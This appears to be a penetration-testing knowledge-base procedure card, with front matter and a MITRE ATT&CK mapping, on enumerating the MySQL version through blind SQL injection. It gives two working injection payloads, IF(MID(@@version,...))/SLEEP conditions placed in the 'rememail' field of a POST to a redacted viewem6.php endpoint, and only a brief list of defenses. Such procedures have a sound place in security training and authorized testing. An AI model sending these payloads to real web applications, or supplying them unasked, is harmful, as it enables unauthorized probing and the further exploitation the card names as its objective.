---
id: proc-uuid-3
tags:
  - sqli
  - boolean-based
  - enumeration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/version-check-4]]'
  - '[[commands/version-check-5]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[System Information Discovery]]'
updated_at: '2025-12-14T03:46:14.966Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[System Information Discovery]]'
---
# Enumerate MySQL Version with Boolean Queries

## Summary

This procedure uses boolean-based blind SQLi to infer the MySQL version by testing conditions that trigger delays, extracting details like 5.0.12 and banner 5.6.36.

## Description

Boolean techniques compare conditions (e.g., version substring) with SLEEP on true, allowing bit-by-bit enumeration in blind scenarios. Builds on time-based confirmation; targets @@version variable.

## Requirements

1. Confirmed time-based vuln
2. Burp Suite for iterative testing
3. Knowledge of MySQL version formats

## Defense

Defensive measures and detection strategies:

- Escape special characters in inputs
- Disable @@version exposure if possible
- Anomaly detection on repeated conditional queries

## Objectives

1. Determine version starting digit
2. Extract full banner
3. Inform further exploitation

## Instructions

### Step 1: Check Version Digit 4

**Context**: Test if version starts with '4' using IF condition.

**Command** ([[commands/version-check-4]]):
```bash
# In Burp Suite: POST https://████████/elist/viewem6.php
# Body: rememail=test@att.net'+IF(MID(@@version,1,1)=4,sleep(2),1)=2+'
```

> No delay expected (false for 5.x).

### Step 2: Check Version Digit 5

**Context**: Test for '5' to confirm.

**Command** ([[commands/version-check-5]]):
```bash
# In Burp Suite: POST https://████████/elist/viewem6.php
# Body: rememail=test@att.net'+IF(MID(@@version,1,1)=5,sleep(2),1)=2+'
```

> Delay confirms version starts with 5; iterate for full details.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[System Information Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/version-check-4]]
- [[commands/version-check-5]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- boolean-based
- enumeration
